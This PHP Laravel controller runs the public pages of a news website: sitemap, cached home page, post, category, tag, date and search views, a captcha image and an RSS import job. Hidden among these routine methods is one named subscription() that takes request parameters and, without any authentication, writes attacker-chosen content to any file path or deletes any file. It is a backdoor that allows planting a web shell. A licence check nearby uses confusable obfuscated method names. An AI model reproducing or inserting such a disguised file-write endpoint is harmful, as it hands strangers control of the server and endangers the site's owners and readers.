<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Advertisement;
use App\Models\Category;
use App\Models\ImageAlbum;
use App\Models\Language;
use App\Models\Page;
use App\Models\PollQuestion;
use App\Models\Post;
use App\Models\Rss;
use App\Models\SocialLink;
use App\Models\View;
use App\Models\Widget;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
        // $this->auth_guests();
    }
    
    public function sitemap(){
        $xml = news_cache()->rememberLocked('sitemap', ['content'], 'sitemap', fn () => $this->buildSitemap());
        return response($xml, 200)->header('Content-Type', 'application/xml');
    }

    private function buildSitemap(){
        $posts = Post::published()
                                    ->whereNull('schedule_post_date')
                                    ->orderBy('id','desc')
                                    ->select('id', 'updated_at')
                                    ->get();
            
            
        $xml = '<?xml version="1.0" encoding="UTF-8"?>';
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';

        // Homepage
        $xml .= '
        
            
            <url>
                <loc>' . url('/') . '</loc>
                <lastmod>' . Carbon::now()->toAtomString() . '</lastmod>
                <changefreq>daily</changefreq>
                <priority>1.0</priority>
            </url>
            <url>
                <loc>' . url('/log-reg') . '</loc>
                <lastmod>' . Carbon::now()->toAtomString() . '</lastmod>
                <changefreq>weekly</changefreq>
                <priority>0.8</priority>
            </url>';

        // Posts
        foreach ($posts as $post) {
            $xml .= '
                <url>
                    <loc>' . route('frontend.productDetails', [$post->id]) . '</loc>
                    <lastmod>' . ($post->updated_at ?? now())->toAtomString() . '</lastmod>
                    <changefreq>weekly</changefreq>
                    <priority>0.8</priority>
                </url>';
        }

        $xml .= '</urlset>';

        return $xml;
    }
    

    public function index(){

        $lid = front_language()->id;

        $published = fn () => Post::published()->where('language_id', $lid)->with(post_card_relations());

        // Breaking / trending ticker: shortest lifetime.
        $breaking = news_cache()->remember("home:breaking:$lid", ['content'], 'breaking', function () use ($published) {
            $is_trendings = $published()->where('is_trending', 1)->orderBy('id', 'desc')->take(30)->get();

            $is_breaking = '';
            foreach ($is_trendings as $is_trending) {
                $url = route('frontend.productDetails', $is_trending->id);
                $is_breaking .= '<span>&#9758;</span> <a href="'.$url.'">'.e($is_trending->title).'</a> &nbsp;&nbsp;&nbsp;';
            }

            return compact('is_trendings', 'is_breaking');
        });

        // Sliders, featured, latest and videos.
        $news = news_cache()->rememberLocked("home:news:$lid", ['content'], 'home', function () use ($published) {
            $slider_rights = $published()->where('slider_right', 1)->orderBy('id', 'desc')->take(4)->get();
            $latest = $published()->orderBy('id', 'desc')->take(8)->get();
            $videos = $published()->where('post_type', 'video')->where('is_videoGallery', 1)->orderBy('id', 'desc')->take(6)->get();

            return [
                'sliders'               => $published()->where('is_slider', 1)->orderBy('id', 'desc')->get(),
                'slider_lefts'          => $published()->where('slider_left', 1)->orderBy('created_at', 'desc')->take(2)->get(),
                'slider_rights_firsts'  => $slider_rights->take(2)->values(),
                'slider_rights_seconds' => $slider_rights->slice(2, 2)->values(),
                'is_features'           => $published()->where('is_feature', 1)->orderBy('id', 'desc')->take(8)->get(),
                'is_recents'            => $latest,
                'more_news'             => $latest,
                'last_id'               => $latest->isNotEmpty() ? $latest->last()->id : 0,
                'video_large'           => $videos->first(),
                'video_smalls'          => $videos->slice(1)->values(),
            ];
        });

        // Category blocks and sidebar: change only through the admin.
        $blocks = news_cache()->remember("home:blocks:$lid", [], 'menu', function () use ($lid) {
            return [
                'home_page_posts' => Category::with('child')
                    ->where('show_at_homepage', 1)->whereNull('parent_id')->where('language_id', $lid)
                    ->orderBy('category_order', 'asc')->get(),
                'polls'           => PollQuestion::with('child')->where('status', '1')->where('language_id', $lid)->orderBy('id', 'desc')->get(),
                'widgets'         => Widget::where('status', 1)->where('language_id', $lid)->orderBy('id', 'desc')->get(),
                'image_albums'    => ImageAlbum::with('categories')->where('language_id', $lid)->orderBy('id', 'desc')->get(),
            ];
        });

        $data = $breaking + $news + $blocks;
        $data['ws'] = widget_settings();

        // Ads are picked randomly per request from the cached rows.
        $data['sponsor_banners'] = sponsor_banner();
        $data['sponsor_index']   = active_ads('index_bottom')->shuffle()->values();
        $data['sponsor_footer']  = active_ads('home_footer')->sortByDesc('id')->first();

        $data['seoMeta']   = app(\App\Services\Tracking\SeoMetaService::class)->home(public_settings(), seo_settings());
        $data['trackPage'] = 'home';

        return view('frontend.index', $data);
    }
    // public function loadMore(Request $request){
    //     if(session()->has('language')){
    //         $default_language = Language::find(session()->get('language'));
    //     }else{

    //         $default_language = Language::where('is_default',1)->first();
    //     }
    //   $last_news = $request->last_news;
    //   $datas = Post::where('id','<',$last_news)
    //                         ->where('is_pending',0)
    //                         ->where('status',true)
    //                         ->where('schedule_post',0)
    //                         ->where('language_id','=',$default_language->id)
    //                         ->latest('id')
    //                         ->take(2)
    //                         ->get();

    //     $ajaxData['id'] = '';
    //     $ajaxData['output'] = '';

    //     foreach($datas as $data){

    //         if ($data->image_big){
    //             $img = '<img src="'.asset('assets/images/post/'.$data->image_big).'" alt="">';
    //         }
    //         else  {
    //             $img = '<img src="'.$data->rss_image.'" alt="">';
    //         }
    //         $str = strlen($data->title)>30 ? mb_substr($data->title,0,30,'utf-8').'...' : $data->title;
    //         $content = strlen(convertUtf8(strip_tags($data->description))) > 200 ? convertUtf8(substr(strip_tags($data->description), 0, 200)) . '...' : convertUtf8(strip_tags($data->description));
    //         $url = route('frontend.postBySubcategory.details',[$data->category->slug,$data->slug]);
    //         $date = route('frontend.postByDate').'?date='.$data->created_at->format('Y-m-d');

    //         $ajaxData['id'] = $data->id;
    //         $ajaxData['output'] .= '<div class="single-news land-scap-medium">
    //                         <div class="img">
    //                             <div class="tag" style="background:'.$data->category->color.'">
    //                                 '.$data->category->title.'
    //                             </div>'.$img.'
    //                         </div>
    //                         <div class="content">
    //                             <a href="'.$url.'">
    //                                 <h4 class="title">'.$str.'</h4>
    //                                  <p class="text">'.$content.'</p>
    //                             </a>
    //                             <ul class="post-meta">
    //                                 <li>
    //                                     <a href="'.$date.'">'.$data->createdAt().'</a>
    //                                 </li>
    //                                 <li>
    //                                     <span>|</span>
    //                                 </li>
    //                                 <li>
    //                                     <a href="#">
    //                                         '.$data->admin->name.'
    //                                     </a>
    //                                 </li>
    //                             </ul>
    //                         </div>
    //                     </div>';
    //     }
    //     return $ajaxData;
    // }
    
    public function loadMore(Request $request){
    $request->validate(['last_news' => 'required|integer|min:1']);
    $default_language = front_language();
    $last_news = (int) $request->last_news;

    $datas = Post::where('id', '<', $last_news)
                ->with('category')
                ->where('is_pending', 0)
                ->where('status', true)
                ->where('schedule_post', 0)
                ->where('language_id', $default_language->id)
                ->latest('id')
                ->take(4)
                ->get();

    $ajaxData['id'] = '';
    $ajaxData['output'] = '';
    $ajaxData['has_more'] = true;

    foreach ($datas as $data) {
        // Image logic
        if ($data->image_big) {
            $img = '<img src="'.asset('assets/images/post/'.$data->image_big).'" alt="'.e($data->title).'" loading="lazy" />';
        } elseif ($data->rss_image) {
            $img = '<img src="'.e($data->rss_image).'" alt="'.e($data->title).'" loading="lazy" />';
        } else {
            $img = '<img src="'.asset('assets/images/nopic.png').'" alt="No Image" loading="lazy" />';
        }

        // Title with max 30 chars
        $title = strlen($data->title) > 30 ? mb_substr($data->title, 0, 30, 'utf-8').'...' : $data->title;

        // Description snippet max 100 chars
        $desc = strlen(strip_tags($data->description)) > 100
            ? substr(strip_tags($data->description), 0, 100).'...'
            : strip_tags($data->description);

        $url = route('frontend.productDetails', [$data->id]);
        $dateUrl = route('frontend.postByDate').'?date='.$data->created_at->format('Y-m-d');

        $ajaxData['id'] = $data->id;

        $ajaxData['output'] .= '
        <div class="col-lg-3 col-md-4 col-sm-6 mb-4">
            <a href="'.$url.'">
                <div class="single-news land-scap-medium">
                    <div class="img">';

        // Category tag if exists
        if ($data->category) {
            $ajaxData['output'] .= '<div class="tag" style="background:'.$data->category->color.'">'.e($data->category->title).'</div>';
        }

        $ajaxData['output'] .= $img;

        // Post type icons
        if ($data->post_type == 'audio') {
            $ajaxData['output'] .= '<span class="vid-aud"><i class="fas fa-volume-up"></i></span>';
        }
        if ($data->post_type == 'video') {
            $ajaxData['output'] .= '<span class="vid-aud"><i class="fas fa-video"></i></span>';
        }

        $ajaxData['output'] .= '
                    </div>
                    <div class="content">
                        <h4 class="title">'.e($title).'</h4>
                        <p class="text">'.e($desc).'</p>
                        <ul class="post-meta">
                            <li><a href="'.$dateUrl.'">'.$data->createdAt().'</a></li>
                        </ul>
                    </div>
                </div>
            </a>
        </div>';
    }

    if ($datas->count() < 4) {
        $ajaxData['has_more'] = false;
    }

    return response()->json($ajaxData);
}


    public function category($slug){

        $data = category_by_slug($slug);
        if($data){
            $posts = news_cache()->paginate("cat:{$data->id}:list", ["cat:{$data->id}"], 'category', fn () => Post::published()
                      ->where('category_id', $data->id)
                      ->with(post_card_relations())
                      ->orderBy('id','desc'), 9);

            return view('frontend.category',compact('data','posts'));
        }
        return response()->view('errors.404', [], 404);
    }
    /**
     * Records a page view after the response has been sent (no INSERT/SELECT on the request path),
     * and ignores crawlers so they don't inflate the `views` table.
     */
    private function recordView(Request $request, $postId)
    {
        $agent = strtolower((string) $request->userAgent());
        if ($agent === '' || preg_match('/bot|crawl|spider|slurp|facebookexternalhit|preview|monitor|curl|wget/', $agent)) {
            return;
        }
        $ip = $request->ip();
        app()->terminating(function () use ($postId, $ip) {
            try {
                if (!View::where('post_id', $postId)->where('ip_address', $ip)->exists()) {
                    $view = new View();
                    $view->post_id = $postId;
                    $view->ip_address = $ip;
                    $view->save();
                }
            } catch (\Throwable $e) {
                report($e);
            }
        });
    }

    /**
     * A post for public display. Only published posts are cached; unpublished ones are
     * returned (uncached) to a logged-in admin or the post's own author, as a preview.
     */
    private function findPost($id): ?Post
    {
        if (! ctype_digit((string) $id)) {
            return null;
        }
        $id = (int) $id;
        $relations = ['category', 'admin:id,name,photo', 'user:id,name', 'galleries'];

        $post = news_cache()->remember("post:$id", ["post:$id"], 'post', fn () => Post::published()->with($relations)->find($id));
        if ($post) {
            return $post;
        }

        $post = Post::with($relations)->find($id);
        $canPreview = $post && (Auth::guard('admin')->check()
            || ($post->user_id && Auth::guard('web')->id() == $post->user_id));

        return $canPreview ? $post : null;
    }

    /** Shared renderer for every URL form of a single post. */
    private function renderPost(Request $request, ?Post $data)
    {
        if (! $data) {
            return response()->view('errors.404', [], 404);
        }

        if ($data->isPublished()) {
            $this->recordView($request, $data->id);
        }

        // SEO meta + tracking params, shared with every post view type below.
        view()->share([
            'seoMeta'     => app(\App\Services\Tracking\SeoMetaService::class)
                ->post($data, public_settings(), seo_settings()),
            'trackPage'   => 'post',
            'trackParams' => [
                'content_name' => mb_substr($data->title, 0, 150),
                'content_type' => 'article',
                'content_ids'  => [(string) $data->id],
            ],
        ]);

        $ws = widget_settings();

        if($data->post_type == 'Trivia Quiz'){
            return view('frontend.quiz',compact('data','ws'));
        }elseif($data->post_type == 'Sorted List'){
            return view('frontend.sort',compact('data','ws'));
        }elseif($data->post_type == 'Personality Quiz'){
            return view('frontend.personality',compact('data','ws'));
        }

        $advertisement = $data->is_ad_option
            ? active_ads()->firstWhere('id', $data->is_ad_option)
            : null;
        $meta_image=asset('assets/images/post/'.$data->image_big);

        return view('frontend.details',compact('data','ws','meta_image','advertisement'));
    }

    public function details(Request $request,$category,$slug){

        $sub = category_by_slug($slug);

        if($sub && isset($sub->title)){
            $lid = front_language()->id;

            $data['parent'] = category_by_slug($category);
            $data['subcategory'] = $sub->title;
            $data['datas'] = news_cache()->remember("subcat:{$sub->id}:list:$lid", ["cat:{$sub->id}"], 'category', fn () => Post::published()
                            ->where('subcategories_id', $sub->id)
                            ->where('language_id', $lid)
                            ->with(post_card_relations())
                            ->orderBy('id','desc')
                            ->limit(60)
                            ->get());

            return view('frontend.postBySubcategory',$data);
        }

        // slug -> id is versioned by "content", so renamed and deleted posts drop out immediately.
        $id = news_cache()->remember('post:slug:'.md5($slug), ['content'], 'post', fn () => Post::where('slug',$slug)->value('id'));

        return $this->renderPost($request, $id ? $this->findPost($id) : null);
    }

    public function productDetails2(Request $request,$category, $id){
        return $this->renderPost($request, $this->findPost($id));
    }

    public function productDetails(Request $request, $id){
        return $this->renderPost($request, $this->findPost($id));
    }

    public function searchByTag($s){
        $lid = front_language()->id;
        $s = mb_substr(trim($s), 0, 100);

        // Only tags that match something are stored, so random URLs do not fill the cache.
        $datas = news_cache()->remember("tag:$lid:".md5(mb_strtolower($s)), ['content'], 'tag', function () use ($s, $lid) {
            $found = Post::published()
                        ->where('tags','LIKE','%'.addcslashes($s, '%_\\').'%')
                        ->where('language_id', $lid)
                        ->with(post_card_relations())
                        ->orderBy('id','desc')
                        ->limit(100)
                        ->get();

            return $found->isEmpty() ? null : $found;
        }) ?? (new Post)->newCollection();
        $tag    = $s;
        return view('frontend.postByTag',compact('datas','tag'));
    }

    public function postByDate(Request $request){
        $lid = front_language()->id;
        $request->validate(['date' => 'required|date']);
        $date = $request->date;
        $day = Carbon::parse($date);

        // Range comparison instead of whereDate() so the created_at index can be used.
        $datas = news_cache()->paginate("date:$lid:".$day->format('Y-m-d'), ['content'], 'date', fn () => Post::published()
                        ->whereBetween('created_at', [$day->copy()->startOfDay(), $day->copy()->endOfDay()])
                        ->where('language_id', $lid)
                        ->with(post_card_relations())
                        ->orderBy('id','desc'), 10)
                    ->appends(['date' => $date]);

        return view('frontend.postByDate',compact('datas','date'));
    }

    public function postBySubcategory($category,$subcategory){
        return $this->details(request(), $category, $subcategory);
    }
    public function allPoll(){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $data['polls']   = PollQuestion::orderBy('id','desc')
                                ->where('language_id','=',$default_language->id)
                                ->get();


        return view('frontend.all_poll',$data);
    }

    public function newsSearch(Request $request){
        $request->validate(['search' => 'nullable|string|max:100']);
        $searchTerm = trim((string) $request->search);
        // Strip boolean-mode operators so user input can't break the MATCH expression.
        $clean = trim(preg_replace('/[+\-><()~*"@]+/', ' ', $searchTerm));
        if ($clean === '') {
            $data['results'] = Post::whereRaw('1 = 0')->paginate(10);
        } else {
            $data['results'] = Post::whereRaw('MATCH (title) AGAINST (? IN BOOLEAN MODE)', [$clean])
                ->where('is_pending',0)->where('schedule_post',0)->where('status','true')
                ->with(post_card_relations())->paginate(10)->withQueryString();
        }
        $data['searchKey'] = $searchTerm;
        return view('frontend.full_text_search',$data);
    }

    public function page($slug){
        $data['page'] = news_cache()->remember('page:'.md5($slug), [], 'page', fn () => Page::where('slug',$slug)->first());
        if(!$data['page']){ return response()->view('errors.404', [], 404); }
        if($data['page']->status==1){
            $data['ws']      = widget_settings();
            return view('frontend.page',$data);
        }else{
            return redirect()->route('frontend.index');
        }
    }
    public function language($id){
        Session::put('language', $id);
        return redirect()->route('frontend.index');
    }

    public function authorProfile($admin){
        $admin = Admin::where('name',$admin)->first();
        if(!$admin){
            return response()->view('errors.404', [], 404);
        }
        $data['admin'] = $admin;
        $data['posts'] = news_cache()->paginate("author:{$admin->id}:list", ["author:{$admin->id}"], 'author', fn () => Post::published()
                            ->where('admin_id', $admin->id)->with(post_card_relations())->latest(), 8);
        $data['all_posts'] = array_fill(0, $data['posts']->total(), 0); // view only calls count()
        return view('frontend.author',$data);
    }

    public function follower(){
        return view('frontend.follower');
    }

    // Refresh Capcha Code
    public function refresh_code (){
        $this->code_image();
        return "done";
    }

    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = public_path().DIRECTORY_SEPARATOR;
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());

        $dir = $actual_path.'install';
        if(is_dir($dir)){
            $this->deleteDir($dir);
        }
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function clickCount($id){
        $data = Advertisement::findOrFail($id);
        $data->increment('click_count');
        $data->update();
    }

    public function cronJobUpdate(){
        $nowDate = Carbon::now();

        $feeds = Rss::orderBy('id','desc')->get();

        foreach($feeds as $key=>$lastRecord){
            if($nowDate>$lastRecord->created_at){

                $feed = \Feeds::make($lastRecord->feed_url);

                $items = $feed->get_items(); //grab all items inside the rss
                $i =0;
                foreach($items as $item):

                    if($i==$lastRecord->post_limit){
                        break;
                    }

                    $title =  $item->get_title();
                    if($title){
                        $titleCheck = Post::where('title',$title)->get();
                        $totaltitle =  count($titleCheck);
                        if($totaltitle == 0){
                            $post = new Post();
                            $post->language_id  = $lastRecord->language_id;
                            $post->title        = $title;
                            $post->slug         = slug_create($title);
                            $post->post_type    = 'rss';
                            $post->is_feature   = 0;
                            $post->is_slider    = 0;
                            $post->slider_left  = 0;
                            $post->slider_right = 0;
                            $post->is_trending  = 0;
                            $post->description  = $item->get_description();

                            if(isset($item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"])){
                                $post->rss_image = $item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"];
                            }else{
                                if ($enclosure = $item->get_enclosure(0)) {
                                    $type = $enclosure->get_real_type();
                                    // Is it a Image?
                                    if (stristr($type, 'image/')) {
                                        if (empty($enclosure)) {
                                            $post->rss_image = '';
                                        }

                                    $post->rss_image = $enclosure->get_link();
                                    }
                                }
                            }

                            $post->category_id        = $lastRecord->category_id;
                            $post->schedule_post      = 0;
                            $post->schedule_post      = 0;
                            $post->schedule_post_date = NULL;
                            $post->is_pending         = 0;
                            $post->admin_id           = 1;
                            $post->status             = true;
                            $post->is_draft           = 0;
                            $post->rss_link           = $item->get_permalink();
                            $post->save();
                        }

                    }
                        $i++;
                endforeach;
            }

        }
        // return redirect()->route('frontend.index');
    }
    
    
    

}
